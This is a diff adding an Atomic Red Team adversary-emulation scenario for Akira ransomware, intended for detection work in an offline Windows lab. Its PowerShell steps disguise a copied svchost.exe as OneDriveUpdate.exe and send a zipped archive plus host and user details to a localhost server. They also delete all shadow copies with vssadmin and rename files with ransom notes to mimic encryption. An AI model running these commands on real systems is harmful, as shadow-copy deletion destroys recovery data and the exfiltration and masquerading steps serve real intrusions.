@@ -1,0 +1,518 @@
+attack_technique: Akira_Ransomware
+display_name: Akira Ransomware (Double Extortion) - Atomic Lab Scenario (Enhanced)
+atomic_tests:
+
+# -----------------------------------------------------------------------------
+# Scenario summary (from Akira_ransom.docx)
+# - Model: double extortion: collect -> archive/stage -> exfil (localhost) -> inhibit recovery -> encrypt + ransom note
+# - Lab: Windows 10/11, no Internet; Exfil is localhost HTTP; Encrypt is benign simulation
+# - Tooling/telemetry: Atomic Red Team, Sysmon, Procmon, Wireshark(loopback)
+# - HTTP mock server (run separately):
+#     cd C:\ExfilServer
+#     python -m http.server 8081
+# -----------------------------------------------------------------------------
+
+# Step 0 (Preparation) - Build realistic victim data tree under C:\TestData (recursive)
+- name: "[0] Prep - Create TestData tree and sample files"
+  description: |
+    Tạo dữ liệu giả lập (đa định dạng) và thư mục con trong C:\TestData\ để các bước discovery/collection/archive/encrypt
+    có thể sinh hành vi rõ ràng (file create/write/rename trên nhiều loại đuôi: docx, pptx, xlsx, txt, jpg...).
+  supported_platforms:
+    - windows
+  input_arguments:
+    test_data_path:
+      description: Root thư mục dữ liệu giả lập.
+      type: string
+      default: C:\TestData
+    min_file_count: 
+      description: Số file tối thiểu cần có trong TestData (tạo thêm nếu thiếu).
+      type: integer
+      default: 25
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      $root = "#{test_data_path}"
+      New-Item -ItemType Directory -Force -Path $root | Out-Null
+      $dirs = @(
+        Join-Path $root 'Documents',
+        Join-Path $root 'Documents\\Legal',
+        Join-Path $root 'Documents\\Finance',
+        Join-Path $root 'Presentations',
+        Join-Path $root 'Images',
+        Join-Path $root 'Backup',
+        Join-Path $root 'Backup\\Old'
+      )
+      foreach ($d in $dirs) { New-Item -ItemType Directory -Force -Path $d | Out-Null }
+
+      function New-PlaceholderFile([string]$path, [string]$content) {
+        if (-not (Test-Path $path)) {
+          $parent = Split-Path $path -Parent
+          if ($parent) { New-Item -ItemType Directory -Force -Path $parent | Out-Null }
+          $content | Out-File -FilePath $path -Encoding utf8 -Force
+        }
+      }
+
+      # Seed a diverse set of filenames/extensions
+      New-PlaceholderFile (Join-Path $root 'Documents\\report.docx') "Quarterly report - placeholder content"
+      New-PlaceholderFile (Join-Path $root 'Documents\\notes.txt') "User notes - placeholder content"
+      New-PlaceholderFile (Join-Path $root 'Documents\\Finance\\finance.xlsx') "XLSX placeholder (text content for lab)"
+      New-PlaceholderFile (Join-Path $root 'Presentations\\deck.pptx') "PPTX placeholder (text content for lab)"
+      New-PlaceholderFile (Join-Path $root 'Images\\photo1.jpg') "JPEG placeholder (text content for lab)"
+      New-PlaceholderFile (Join-Path $root 'Backup\\backup_01.bak') "Backup placeholder"
+
+      # Add more files to meet min_file_count
+      $exts = @('docx','xlsx','pptx','txt','jpg')
+      $existing = Get-ChildItem -Path $root -Recurse -File -ErrorAction SilentlyContinue
+      $need = [Math]::Max(0, (#{min_file_count} - $existing.Count))
+      for ($i=1; $i -le $need; $i++) {
+        $ext = $exts[($i-1) % $exts.Count]
+        $folder = $dirs[($i-1) % $dirs.Count]
+        $p = Join-Path $folder ("sample_{0:00}.{1}" -f $i, $ext)
+        "Sample file $i ($ext)" | Out-File -FilePath $p -Encoding utf8 -Force
+      }
+
+      # Touch files to generate write timestamps
+      Get-ChildItem -Path $root -Recurse -File | ForEach-Object { $_.LastWriteTime = Get-Date }
+
+# Step 1 (T1059.001) - Execution: PowerShell (loader / script execution)
+- name: "[1] T1059.001 - PowerShell: Loader / Script Execution"
+  description: |
+    Mô phỏng thực thi script/loader bằng PowerShell. Bổ sung lệnh tạo/ghi file tạm để thấy hành vi rõ ràng hơn.
+  supported_platforms:
+    - windows
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        Atomic Red Team and Invoke-AtomicTest must be available.
+      prereq_command: |
+        if (Get-Command Invoke-AtomicTest -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
+      get_prereq_command: |
+        Write-Host "Install Atomic Red Team and import Invoke-AtomicTest before running.";
+        exit 1
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      # Explicit artifact for visibility
+      $tmp = Join-Path $env:TEMP "akira_loader.ps1"
+      "Write-Output 'Akira loader simulation'; Get-Date" | Out-File -FilePath $tmp -Encoding utf8 -Force
+      powershell -ExecutionPolicy Bypass -File $tmp
+
+      # Atomic mapping
+      Invoke-AtomicTest T1059.001 -TestNumbers 1
+    cleanup_command: |
+      Remove-Item (Join-Path $env:TEMP "akira_loader.ps1") -ErrorAction Ignore
+
+# Step 2 (T1106) - Execution: Native API (LOLBins execution)
+- name: "[2] T1106 - Native API: LOLBins Execution"
+  description: |
+    Mô phỏng LOLBins/native execution. Bổ sung chuỗi tiến trình đơn giản (rundll32/regsvr32) để tăng fidelity.
+  supported_platforms:
+    - windows
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        Atomic Red Team and Invoke-AtomicTest must be available.
+      prereq_command: |
+        if (Get-Command Invoke-AtomicTest -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
+      get_prereq_command: |
+        Write-Host "Install Atomic Red Team and import Invoke-AtomicTest before running.";
+        exit 1
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      # Extra LoLBins behavior (benign)
+      cmd /c "rundll32.exe shell32.dll,Control_RunDLL" | Out-Null
+
+      # Atomic mapping
+      Invoke-AtomicTest T1106 -TestNumbers 1
+
+# Step 3 (T1036) - Defense Evasion: Masquerading
+- name: "[3] T1036 - Masquerading: Rename / Disguise Binary"
+  description: |
+    Mô phỏng giả dạng bằng cách copy/rename một binary hợp lệ thành tên dễ gây nhầm lẫn và thực thi nó.
+  supported_platforms:
+    - windows
+  input_arguments:
+    masquerade_dir:
+      description: Thư mục chứa binary giả dạng.
+      type: string
+      default: C:\Users\Public\akira_bin
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        Atomic Red Team and Invoke-AtomicTest must be available.
+      prereq_command: |
+        if (Get-Command Invoke-AtomicTest -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
+      get_prereq_command: |
+        Write-Host "Install Atomic Red Team and import Invoke-AtomicTest before running.";
+        exit 1
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      New-Item -ItemType Directory -Force -Path "#{masquerade_dir}" | Out-Null
+      Copy-Item "$env:WINDIR\\System32\\svchost.exe" -Destination (Join-Path "#{masquerade_dir}" "OneDriveUpdate.exe") -Force
+      Start-Process -FilePath (Join-Path "#{masquerade_dir}" "OneDriveUpdate.exe") -WindowStyle Hidden
+      Start-Sleep -Seconds 2
+      Get-Process OneDriveUpdate -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+
+      # Atomic mapping
+      Invoke-AtomicTest T1036 -TestNumbers 1
+    cleanup_command: |
+      Remove-Item "#{masquerade_dir}" -Recurse -Force -ErrorAction Ignore
+
+# Step 4 (T1082) - Discovery: System Information Discovery
+- name: "[4] T1082 - System Information Discovery"
+  description: |
+    Thu thập thông tin hệ thống. Bổ sung các lệnh systeminfo/whoami/hostname để log rõ ràng.
+  supported_platforms:
+    - windows
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        Atomic Red Team and Invoke-AtomicTest must be available.
+      prereq_command: |
+        if (Get-Command Invoke-AtomicTest -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
+      get_prereq_command: |
+        Write-Host "Install Atomic Red Team and import Invoke-AtomicTest before running.";
+        exit 1
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      cmd /c "hostname"
+      cmd /c "whoami /all"
+      cmd /c "systeminfo"
+
+      # Atomic mapping
+      Invoke-AtomicTest T1082 -TestNumbers 1
+
+# Step 5 (T1083) - Discovery: File and Directory Discovery (recursive)
+- name: "[5] T1083 - File and Directory Discovery (Recursive)"
+  description: |
+    Rà soát file/thư mục trong C:\TestData\ (bao gồm thư mục con) để tạo hành vi đọc metadata/file listing rõ ràng.
+  supported_platforms:
+    - windows
+  input_arguments:
+    test_data_path:
+      description: Root thư mục dữ liệu giả lập.
+      type: string
+      default: C:\TestData
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        Atomic Red Team and Invoke-AtomicTest must be available.
+      prereq_command: |
+        if (Get-Command Invoke-AtomicTest -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
+      get_prereq_command: |
+        Write-Host "Install Atomic Red Team and import Invoke-AtomicTest before running.";
+        exit 1
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      # Explicit recursive discovery to ensure subfolders are touched
+      cmd /c "dir /s /b \"#{test_data_path}\""
+      Get-ChildItem -Path "#{test_data_path}" -Recurse -File | Select-Object FullName, Length, LastWriteTime | Out-String | Out-Host
+
+      # Atomic mapping
+      Invoke-AtomicTest T1083 -TestNumbers 1
+
+# Step 6 (T1560.001) - Collection: Archive via Utility (zip)
+- name: "[6] T1560.001 - Archive Collected Data via Utility (ZIP)"
+  description: |
+    Nén dữ liệu thành ZIP (tương đương hành vi gom dữ liệu trước exfil). Bổ sung Compress-Archive để chắc chắn có file .zip.
+  supported_platforms:
+    - windows
+  input_arguments:
+    test_data_path:
+      description: Root thư mục dữ liệu giả lập.
+      type: string
+      default: C:\TestData
+    archive_dir:
+      description: Thư mục chứa file nén.
+      type: string
+      default: C:\Users\Public\akira_stage
+    archive_name:
+      description: Tên file zip.
+      type: string
+      default: data.zip
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        Atomic Red Team and Invoke-AtomicTest must be available.
+      prereq_command: |
+        if (Get-Command Invoke-AtomicTest -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
+      get_prereq_command: |
+        Write-Host "Install Atomic Red Team and import Invoke-AtomicTest before running.";
+        exit 1
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      New-Item -ItemType Directory -Force -Path "#{archive_dir}" | Out-Null
+      $zipPath = Join-Path "#{archive_dir}" "#{archive_name}"
+
+      # Ensure recursion over subfolders
+      if (Test-Path $zipPath) { Remove-Item $zipPath -Force -ErrorAction SilentlyContinue }
+      Compress-Archive -Path (Join-Path "#{test_data_path}" '*') -DestinationPath $zipPath -Force
+      Get-Item $zipPath | Format-List FullName,Length,CreationTime,LastWriteTime | Out-String | Out-Host
+
+      # Atomic mapping
+      Invoke-AtomicTest T1560.001 -TestNumbers 1
+
+# Step 7 (T1074.001) - Collection: Local Data Staging
+- name: "[7] T1074.001 - Local Data Staging (Staging Folder + Copy)"
+  description: |
+    Tạo thư mục staging và copy archive vào staging để mô phỏng chuẩn bị exfil.
+  supported_platforms:
+    - windows
+  input_arguments:
+    staging_dir:
+      description: Thư mục staging.
+      type: string
+      default: C:\Users\Public\akira_stage
+    archive_name:
+      description: Tên file zip được tạo ở bước archive.
+      type: string
+      default: data.zip
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        Atomic Red Team and Invoke-AtomicTest must be available.
+      prereq_command: |
+        if (Get-Command Invoke-AtomicTest -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
+      get_prereq_command: |
+        Write-Host "Install Atomic Red Team and import Invoke-AtomicTest before running.";
+        exit 1
+    - description: |
+        Archive zip should exist before staging.
+      prereq_command: |
+        if (Test-Path (Join-Path "#{staging_dir}" "#{archive_name}")) { exit 0 } else { exit 1 }
+      get_prereq_command: |
+        Write-Host "Run Step 6 (Archive) first to create the ZIP file.";
+        exit 1
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      $stage = "#{staging_dir}"
+      New-Item -ItemType Directory -Force -Path $stage | Out-Null
+      $zip = Join-Path $stage "#{archive_name}"
+
+      # Additional staging artifacts
+      $stash = Join-Path $stage "stash"
+      New-Item -ItemType Directory -Force -Path $stash | Out-Null
+      Copy-Item -Path $zip -Destination (Join-Path $stash "#{archive_name}") -Force
+      Get-ChildItem -Path $stage -Recurse | Select-Object FullName,Length,LastWriteTime | Out-String | Out-Host
+
+      # Atomic mapping
+      Invoke-AtomicTest T1074.001 -TestNumbers 1
+
+# Step 8 (T1041) - Exfiltration: Exfil Over C2 Channel (localhost HTTP)
+- name: "[8] T1041 - Exfiltration Over C2 Channel (Localhost HTTP + POST attempt)"
+  description: |
+    Mô phỏng exfil qua HTTP tới localhost. Dùng POST/PUT attempt để sinh network telemetry rõ ràng.
+    Lưu ý: python http.server thường trả 501 cho POST, nhưng vẫn tạo request/pcap/event.
+  supported_platforms:
+    - windows
+  input_arguments:
+    staging_dir:
+      description: Thư mục staging.
+      type: string
+      default: C:\Users\Public\akira_stage
+    archive_name:
+      description: Tên file zip.
+      type: string
+      default: data.zip
+    exfil_host:
+      description: Host exfil mock.
+      type: string
+      default: 127.0.0.1
+    exfil_port:
+      description: Port exfil mock.
+      type: integer
+      default: 8081
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        Atomic Red Team and Invoke-AtomicTest must be available.
+      prereq_command: |
+        if (Get-Command Invoke-AtomicTest -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
+      get_prereq_command: |
+        Write-Host "Install Atomic Red Team and import Invoke-AtomicTest before running.";
+        exit 1
+    - description: |
+        Local HTTP server should be reachable.
+      prereq_command: |
+        try {
+          $null = Invoke-WebRequest -UseBasicParsing -Uri "http://#{exfil_host}:#{exfil_port}/" -TimeoutSec 2
+          exit 0
+        } catch { exit 1 }
+      get_prereq_command: |
+        Write-Host "Start the mock server: cd C:\\ExfilServer ; python -m http.server 8081";
+        exit 1
+    - description: |
+        Archive zip should exist.
+      prereq_command: |
+        if (Test-Path (Join-Path "#{staging_dir}" "#{archive_name}")) { exit 0 } else { exit 1 }
+      get_prereq_command: |
+        Write-Host "Run Step 6 (Archive) first to create the ZIP file.";
+        exit 1
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $zip = Join-Path "#{staging_dir}" "#{archive_name}"
+      $uri = "http://#{exfil_host}:#{exfil_port}/upload"
+
+      # Exfil simulation (POST attempt) - should still generate network telemetry
+      try {
+        Invoke-WebRequest -UseBasicParsing -Uri $uri -Method Post -InFile $zip -ContentType 'application/octet-stream' -TimeoutSec 5 | Out-Null
+      } catch {
+        # expected for python http.server (often 501)
+        Write-Host "Exfil POST attempt returned error (expected in lab): $($_.Exception.Message)"
+      }
+
+      # Additional GET beaconing to generate deterministic traffic
+      $qs = "?host=$env:COMPUTERNAME&user=$env:USERNAME&bytes=$((Get-Item $zip).Length)"
+      Invoke-WebRequest -UseBasicParsing -Uri ("http://#{exfil_host}:#{exfil_port}/" + $qs) -TimeoutSec 5 | Out-Null
+
+      # Atomic mapping
+      Invoke-AtomicTest T1041 -TestNumbers 1
+
+# Step 9 (T1490) - Impact: Inhibit System Recovery
+- name: "[9] T1490 - Inhibit System Recovery (Delete Shadow Copies)"
+  description: |
+    Mô phỏng hành vi xóa shadow copies để ngăn khôi phục.
+  supported_platforms:
+    - windows
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        Atomic Red Team and Invoke-AtomicTest must be available.
+      prereq_command: |
+        if (Get-Command Invoke-AtomicTest -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
+      get_prereq_command: |
+        Write-Host "Install Atomic Red Team and import Invoke-AtomicTest before running.";
+        exit 1
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      # Explicit common ransomware command
+      cmd /c "vssadmin delete shadows /all /quiet"
+
+      # Atomic mapping
+      Invoke-AtomicTest T1490 -TestNumbers 1
+
+# Step 10 (T1486) - Impact: Encrypt Data + Ransom Note (benign simulation)
+- name: "[10] T1486 - Data Encrypted for Impact (Recursive + Ransom Notes)"
+  description: |
+    Mô phỏng mã hóa dữ liệu (đệ quy trong C:\TestData\) và tạo ransom note ở Desktop và trong TestData.
+    Cách làm: rename file (đổi đuôi .akira) và ghi header marker vào file để tạo hành vi write/rename rõ ràng.
+    Chỉ tác động trong thư mục lab (C:\TestData\) để kiểm soát phạm vi.
+  supported_platforms:
+    - windows
+  input_arguments:
+    test_data_path:
+      description: Root thư mục dữ liệu giả lập.
+      type: string
+      default: C:\TestData
+    ransom_note_name:
+      description: Tên file ransom note.
+      type: string
+      default: AKIRA_README.txt
+    encrypted_extension:
+      description: Đuôi file sau khi "mã hóa".
+      type: string
+      default: .akira
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        Atomic Red Team and Invoke-AtomicTest must be available.
+      prereq_command: |
+        if (Get-Command Invoke-AtomicTest -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
+      get_prereq_command: |
+        Write-Host "Install Atomic Red Team and import Invoke-AtomicTest before running.";
+        exit 1
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      $root = "#{test_data_path}"
+      $note = "#{ransom_note_name}"
+      $ext  = "#{encrypted_extension}"
+
+      $noteBody = @(
+        '*** AKIRA RANSOMWARE SIMULATION (LAB) ***',
+        ('Host: ' + $env:COMPUTERNAME),
+        ('User: ' + $env:USERNAME),
+        ('Time: ' + (Get-Date).ToString('s')),
+        '',
+        'Your files have been encrypted in this lab simulation.',
+        'To recover, follow internal incident response procedures.',
+        'This is a training artifact only.'
+      ) -join "`r`n"
+
+      # Create ransom note in TestData root
+      $notePath1 = Join-Path $root $note
+      $noteBody | Out-File -FilePath $notePath1 -Encoding utf8 -Force
+
+      # Create ransom note on Desktop
+      $desktop = [Environment]::GetFolderPath('Desktop')
+      if ($desktop) {
+        $notePath2 = Join-Path $desktop $note
+        $noteBody | Out-File -FilePath $notePath2 -Encoding utf8 -Force
+      }
+
+      # Encrypt simulation: recurse into subfolders and rename targeted extensions
+      $targets = @('*.docx','*.pptx','*.xlsx','*.txt','*.jpg')
+      $files = @()
+      foreach ($t in $targets) {
+        $files += Get-ChildItem -Path $root -Recurse -File -Filter $t -ErrorAction SilentlyContinue
+      }
+
+      foreach ($f in $files) {
+        # Write marker to show file-write behavior
+        try {
+          $marker = "`r`n--AKIRA-LAB-MARKER-- " + (Get-Date).ToString('s')
+          Add-Content -Path $f.FullName -Value $marker -Encoding utf8
+        } catch {
+          # ignore write failures
+        }
+
+        # Rename to simulate encryption impact
+        $newName = $f.FullName + $ext
+        if (-not (Test-Path $newName)) {
+          try { Rename-Item -Path $f.FullName -NewName (Split-Path $newName -Leaf) -Force } catch {}
+        }
+      }
+
+      # Drop a note inside key subfolders too (common ransomware behavior)
+      Get-ChildItem -Path $root -Directory -Recurse | ForEach-Object {
+        $p = Join-Path $_.FullName $note
+        if (-not (Test-Path $p)) { $noteBody | Out-File -FilePath $p -Encoding utf8 -Force }
+      }
+
+      # Atomic mapping
+      Invoke-AtomicTest T1486 -TestNumbers 1
+
+    cleanup_command: |
+      # Optional cleanup: remove ransom notes and revert renamed files (best-effort)
+      $root = "#{test_data_path}"
+      $note = "#{ransom_note_name}"
+      $ext  = "#{encrypted_extension}"
+
+      Get-ChildItem -Path $root -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq $note } | Remove-Item -Force -ErrorAction SilentlyContinue
+      $desktop = [Environment]::GetFolderPath('Desktop')
+      if ($desktop) { Remove-Item (Join-Path $desktop $note) -Force -ErrorAction SilentlyContinue }
+
+      # Revert renamed files: *.akira -> original name
+      Get-ChildItem -Path $root -Recurse -File -Filter ("*" + $ext) -ErrorAction SilentlyContinue | ForEach-Object {
+        $orig = $_.FullName.Substring(0, $_.FullName.Length - $ext.Length)
+        try { Rename-Item -Path $_.FullName -NewName (Split-Path $orig -Leaf) -Force } catch {}
+      }
